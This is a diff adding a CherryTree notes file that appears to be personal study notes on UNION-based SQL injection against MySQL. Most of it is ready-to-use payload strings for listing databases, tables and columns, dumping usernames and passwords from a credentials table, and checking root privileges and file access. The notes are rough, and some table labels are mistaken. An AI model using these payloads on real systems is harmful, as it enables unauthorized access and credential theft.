@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="27" master_id="0" name="fingerprinting" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747419801" ts_lastsave="1747431380">
+    <rich_text>Every Database has the database: INFORMATION_SCHEMA which stores metadata.
+
+Other Tables within a DB can be called with DATABASE.ELEMENT
+INFORMATION_SCHEMA.SCHEMATA enthält alle Datenbanken.
+
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>'UNION dsd
+
+with database() i get to see which db the web app. is using.
+
+
+
+
+TABLE_NAME, TABLE_SCHMA from INORMATION_SCHEMA.TABLES to get the Tables and the database they are linked to.
+
+
+
+
+See the Columns:
+
+
+See the data:
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+
+
+
+
+
+
+Privaleges: 
+
+
+
+database</rich_text>
+    <codebox char_offset="192" justification="left" frame_width="1012" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</codebox>
+    <encoded_png char_offset="194" justification="left" link="" sha256sum="06ede41c8abe87608c1d1af05bb4138aab549f333b6887ef37fd967f55e5f07b"/>
+    <codebox char_offset="268" justification="left" frame_width="603" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cn' UNION select 1,database(),2,3-- -</codebox>
+    <encoded_png char_offset="271" justification="left" link="" sha256sum="c7afeb0f6c1702eb0046539f0531b0c8f6e971d1ab5c03288c9c7f1501d4b9be"/>
+    <codebox char_offset="383" justification="left" frame_width="1474" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</codebox>
+    <encoded_png char_offset="386" justification="left" link="" sha256sum="d9067d4c6161398bcf09f5001a91be1fc44fce0b6724b2231b27b5a42cb656a3"/>
+    <codebox char_offset="406" justification="left" frame_width="1712" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</codebox>
+    <encoded_png char_offset="408" justification="left" link="" sha256sum="3362274f718e805be700082ad4bfe054e1f7834cd2964cbafab361e39aea76e9"/>
+    <codebox char_offset="424" justification="left" frame_width="942" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cn' UNION select 1, username, password, 4 from dev.credentials-- -</codebox>
+    <encoded_png char_offset="426" justification="left" link="" sha256sum="3362274f718e805be700082ad4bfe054e1f7834cd2964cbafab361e39aea76e9"/>
+    <table char_offset="433" justification="left" col_min="300" col_max="300" col_widths="0,0">
+      <row>
+        <cell>SELECT SLEEP(5)</cell>
+        <cell>ingerprint MySQL with no output</cell>
+      </row>
+      <row>
+        <cell>cn' UNION select 1,database(),2,3-- -</cell>
+        <cell>Current database name</cell>
+      </row>
+      <row>
+        <cell>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -	</cell>
+        <cell>List all databases</cell>
+      </row>
+      <row>
+        <cell>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</cell>
+        <cell>List all columns in a specific table</cell>
+      </row>
+      <row>
+        <cell>cn' UNION select 1, username, password, 4 from dev.credentials-- -</cell>
+        <cell>Dump data from a table in another database</cell>
+      </row>
+      <row>
+        <cell>SELECT @@version	</cell>
+        <cell>Fingerprint MySQL with query output</cell>
+      </row>
+    </table>
+    <table char_offset="450" justification="left" col_min="300" col_max="300" col_widths="0,0">
+      <row>
+        <cell>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</cell>
+        <cell>Find if user has admin privileges</cell>
+      </row>
+      <row>
+        <cell>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -	</cell>
+        <cell>Find if all user privileges</cell>
+      </row>
+      <row>
+        <cell>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</cell>
+        <cell>Find which directories can be accessed through MySQL</cell>
+      </row>
+      <row>
+        <cell>cn' UNION SELECT 1, user(), 3, 4-- -</cell>
+        <cell>Find current user</cell>
+      </row>
+    </table>
+  </node>
+</cherrytree>
